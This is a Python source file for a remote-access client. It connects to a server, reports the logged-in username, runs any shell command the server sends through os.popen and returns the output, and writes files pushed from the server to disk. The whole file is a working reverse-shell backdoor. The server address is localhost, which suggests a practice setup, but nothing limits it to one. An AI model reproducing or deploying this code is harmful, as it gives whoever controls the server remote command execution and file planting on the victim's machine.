import socket
from getpass import getuser
import os, sys

class Client:
    def __init__(self):
        self.SERVER_IP = '127.0.0.1'
        self.PORT = 3056
        self.ADDR = (self.SERVER_IP, self.PORT)
        self.SIZE = 1024

        self._socket = socket.socket()
        self.open_socket()
        self.receive_loop()

    def open_socket(self):
        self._socket.connect(self.ADDR)
        self._socket.sendall(getuser().encode())


    def transfer(self):
        typ = self._socket.recv(self.SIZE).decode()
        print(typ)

        if typ == 'command':
            self._socket.sendall('Ready'.encode())
            recv = self._socket.recv(self.SIZE).decode()
            res = os.popen(recv).read()
            if res == '':
                res = 'No Result'
            self._socket.sendall(res.encode())

        elif typ == 'file send':
            self._socket.sendall('Ready'.encode())
            with open('recvFILE', 'wb') as f:
                while True:
                    _buff = self._socket.recv(self.SIZE)
                    if _buff == b'99':
                        print('end')
                        break
                    else:
                        f.write(_buff)
                        self._socket.sendall('ok'.encode())

        else:
            self._socket.sendall('Undefined command'.encode())


    def receive_loop(self):
        while True:
            self.transfer()


if __name__ == '__main__':
    c = Client()
